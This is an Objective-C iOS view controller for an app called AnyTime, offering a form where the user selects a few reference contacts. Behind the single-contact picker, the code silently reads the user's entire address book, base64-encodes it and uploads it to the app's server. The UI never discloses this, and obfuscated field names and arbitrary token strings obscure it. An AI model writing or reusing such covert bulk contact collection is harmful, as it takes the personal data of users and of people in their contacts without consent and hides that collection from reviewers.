//
//  AnyContactInforViewController.m
//  AnyTime
//  
//  Created by wealon on 2025.
//  AnyTime.
//  
    

#import "AnyContactInforViewController.h"
#import "AnyContactInforCell.h"
#import "AnyContactManager.h"
#import "AnyTimeCustomPopupView.h"

@interface AnyContactInforViewController ()<UITableViewDelegate, UITableViewDataSource>
@property (nonatomic, strong) UITableView *tableView;
@property (nonatomic, strong) NSMutableArray<NSMutableDictionary *> *blow;
@property (nonatomic, strong) AnyContactManager *manager;
@property (nonatomic, assign) BOOL isUpload;
@end

@implementation AnyContactInforViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    AnyContactManager *manager = [[AnyContactManager alloc]init];
    self.manager = manager;
    
    self.blow = [NSMutableArray array];
    self.topImageView.image = [UIImage imageNamed:@"contact-Information"];
    [self getData];
}
- (void)setupUI {
    [super setupUI];
    UIImageView *bgImageView = [UIImageView new];
    CGPoint stretchPoint = CGPointMake(100, 100); // 以 (100,100) 为基准点
    UIEdgeInsets insets = UIEdgeInsetsMake(stretchPoint.y, stretchPoint.x, stretchPoint.y, stretchPoint.x);
    UIImage *originalImage = [UIImage imageNamed:@"cer-bg-icon"];
    UIImage *resizableImage = [originalImage resizableImageWithCapInsets:insets resizingMode:UIImageResizingModeStretch];
    bgImageView.image = resizableImage;
    [self.view addSubview:bgImageView];
 
    
    self.tableView = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStylePlain];
    self.tableView.backgroundColor = [UIColor clearColor];
    self.tableView.tableHeaderView = [UIView new] ;
    self.tableView.tableFooterView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, SCREEN_WIDTH, 20)];
    self.tableView.separatorStyle = UITableViewCellSeparatorStyleNone;
    self.tableView.delegate = self;
    self.tableView.dataSource = self;
    [self.tableView registerNib:[UINib nibWithNibName:@"AnyContactInforCell" bundle:nil] forCellReuseIdentifier:@"AnyContactInforCell"];
    // 添加到视图
    [self.view addSubview:self.tableView];
    self.tableView.layer.maskedCorners = kCALayerMinXMaxYCorner|kCALayerMaxXMaxYCorner;
    self.tableView.layer.cornerRadius = 12;
    self.tableView.layer.masksToBounds = YES;
    self.tableView.layer.borderColor = [UIColor blackColor].CGColor;
    self.tableView.backgroundColor = [UIColor clearColor];
    self.tableView.layer.borderWidth = 1;
    [self.tableView mas_makeConstraints:^(MASConstraintMaker *make) {
        make.left.mas_equalTo(15);
        make.right.mas_equalTo(-15);
        make.top.mas_equalTo(self.topImageView.mas_bottom).offset(-5);
        make.bottom.mas_equalTo(self.sureButton.mas_top).offset(-20);
    }];
    
    [bgImageView mas_makeConstraints:^(MASConstraintMaker *make) {
        make.edges.mas_equalTo(self.tableView);
    }];
}
- (void) getData {
    NSDictionary *rest = self.parameters[@"rest"];
    NSString *funny = rest[@"funny"];
    [AnyTimeHUD showLoadingHUD];
    [AnyHttpTool fetchContactInfoWithBox:funny saying:@"dsa9344812fvndu" success:^(id  _Nonnull responseObject) {
        [AnyTimeHUD hideHUD];
        NSDictionary *mountain = responseObject[@"mountain"];
        NSArray *blow = mountain[@"blow"];
        [self.blow removeAllObjects];
        for (NSDictionary *dict in blow) {
            NSMutableDictionary *item = [NSMutableDictionary dictionaryWithDictionary:dict];
            [self.blow addObject:item];
        }
        [self.tableView reloadData];
    } failure:^(NSError * _Nonnull error) {
        [AnyTimeHUD hideHUD];
        [AnyTimeHUD showTextWithText:error.localizedDescription];
    }];
}
- (void) sureButtonClick {
        NSDictionary *rest = self.parameters[@"rest"];
        NSString *funny = rest[@"funny"];
    NSMutableArray *dataArray = [NSMutableArray array];
    for (NSDictionary *dict in self.blow) {
        [dataArray addObject:@{
            @"amusement": [NSString stringWithFormat:@"%@", dict[@"amusement"]],
            @"groove": [NSString stringWithFormat:@"%@", dict[@"groove"]],
            @"if": [NSString stringWithFormat:@"%@", dict[@"if"]],
            @"spoke": [NSString stringWithFormat:@"%@", dict[@"spoke"]]
        }];
    }
    NSString *json = [AnyDevHelper jsonStringFromArray:dataArray];
    [AnyTimeHUD showLoadingHUD];
    [AnyHttpTool saveContactInfoWithBox:funny gone:json success:^(id  _Nonnull responseObject) {
        [AnyTimeHUD hideHUD];
        self.endTime = [AnyDevHelper currentTimestamp];
        [AnyHttpTool reportRiskGate:funny commanded:@"7" agreed:@"" allowance:self.stateTime large:self.endTime father:@"dsjkafhkdlsafnds,.avcdsa" success:^(id  _Nonnull responseObject) {
        } failure:^(NSError * _Nonnull error) {
        }];
        [[AnyRouter sharedInstance] openURL:@"/next" parameters:self.parameters from:self callback:^(NSDictionary * _Nullable result) {
                    
                }];
    } failure:^(NSError * _Nonnull error) {
        [AnyTimeHUD hideHUD];
        [AnyTimeHUD showTextWithText:error.localizedDescription];
    }];
}
#pragma mark - UITableViewDataSource
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
    return 1;
}
// 返回行数
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return self.blow.count;
}

- (UIView *)tableView:(UITableView *)tableView viewForFooterInSection:(NSInteger)section {
    return [[UIView alloc]initWithFrame:(CGRectMake(0, 0, 0.01, 0.01))];
}
- (CGFloat) tableView:(UITableView *)tableView heightForFooterInSection:(NSInteger)section {
    return  0.01;
}
// 返回 Cell
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    AnyContactInforCell *cell = [tableView dequeueReusableCellWithIdentifier:@"AnyContactInforCell" forIndexPath:indexPath];
    NSDictionary *dict = self.blow[indexPath.row];
    NSString *really = dict[@"really"];
    cell.titleLabel.text = really;
    cell.subTitleLabel.text = @"A contact must be selected";
    cell.relationshipTextField.placeholder = dict[@"such"] ?: @"";
    cell.contactTextField.placeholder = dict[@"innocence"] ?: @"";
    
    cell.relationshipTextField.text = dict[@"life"];
    
    NSString *groove = [NSString stringWithFormat:@"%@", dict[@"groove"]];
    NSString *amusement = [NSString stringWithFormat:@"%@", dict[@"amusement"]];
    if (groove.length > 0 && amusement.length > 0) {
        NSString *text = [NSString stringWithFormat:@"%@:%@",groove, amusement];
        cell.contactTextField.text = text;
    } else {
        cell.contactTextField.text = @"";
    }
    cell.contactHandler = ^{
        [self contactSelect:self.blow[indexPath.row]];
    };
    
    cell.relationHandler = ^{
        [self enumPopView:self.blow[indexPath.row]];
    };
    
    return cell;
}

#pragma mark - UITableViewDelegate

// 选中 Cell
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    
}
- (void)enumPopView:(NSMutableDictionary *)dict {
    NSArray *its = dict[@"its"] ?: @[];
    NSMutableArray<AnySelectModel *> *dataArray = [NSMutableArray array];
    for (NSDictionary *dict in its) {
        AnySelectModel *model = [AnySelectModel new];
        model.title = [NSString stringWithFormat:@"%@", dict[@"groove"]];
        [dataArray addObject:model];
    }
    AnySelectPop *pop = [[AnySelectPop alloc]init];
    pop.dataSourceArray = dataArray;
    
    pop.selectHandler = ^(NSString * _Nonnull address, NSInteger index) {
        dict[@"life"] = address;
        NSDictionary *dd = its[index];
        NSString *aura = [NSString stringWithFormat:@"%@", dd[@"aura"]];
        dict[@"if"] = aura;
        [self.tableView reloadData];
    };
    pop.modalPresentationStyle = UIModalPresentationOverFullScreen;
    [self presentViewController:pop animated:YES completion:^{
    }];
    pop.titleLabel.text = [NSString stringWithFormat:@"%@",dict[@"really"]];
}
- (void) contactSelect:(NSMutableDictionary *)dict {
    [AnyContactManager requestContactAccessWithCompletion:^(BOOL granted) {
        if (granted) {
            [self.manager selectContactFromViewController:self callback:^(NSString * _Nonnull name, NSString * _Nonnull phoneNumber) {
                if (name.length > 0 && phoneNumber.length > 0) {
                    dict[@"groove"] = name;
                    dict[@"amusement"] = phoneNumber;
                } else {
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                        [AnyTimeHUD showTextWithText:@"The contact format is incorrect"];
                    });
                }
                [self.tableView reloadData];
            }];
            
            if (!self.isUpload) {
                [self.manager getAllContactsWithCompletion:^(NSArray<NSDictionary *> * _Nonnull contacts) {
                    NSString *json = [AnyDevHelper jsonStringFromArray:contacts];
                    NSString * baseStr = [AnyDevHelper base64Encode:json];
                    [AnyHttpTool reportContactsWithAura:@"3" statue:@"sdsafdsljflsdf" standing:@"flskadjflsdafdslakfjsadf" gone:baseStr success:^(id  _Nonnull responseObject) {
                        self.isUpload = YES;
                    } failure:^(NSError * _Nonnull error) {
                        
                    }];
                }];
            }
            
        } else {
            dispatch_async(dispatch_get_main_queue(), ^{
                AnyTimeCustomPopupView *popupView = [[AnyTimeCustomPopupView alloc] initGoOutAccountWithFrame:self.view.bounds];
                popupView.backgroundImage = [UIImage imageNamed:@"anytime_alertbg"];
                popupView.titleText = @"Contact authority";
                popupView.descriptionText = @"Contact rights are required";
                popupView.firstButtonTitle = @"Confirm";
                popupView.secondButtonTitle = @"Cancel";
                
                popupView.firstButtonAction = ^{
                    [AnyRouterTool  openAppSettings];
                };
                popupView.secondButtonAction = ^{
                };
                popupView.closeAction = ^{
                };
                [popupView showInView:self.view];
            });
            
        }
    }];
}
@end
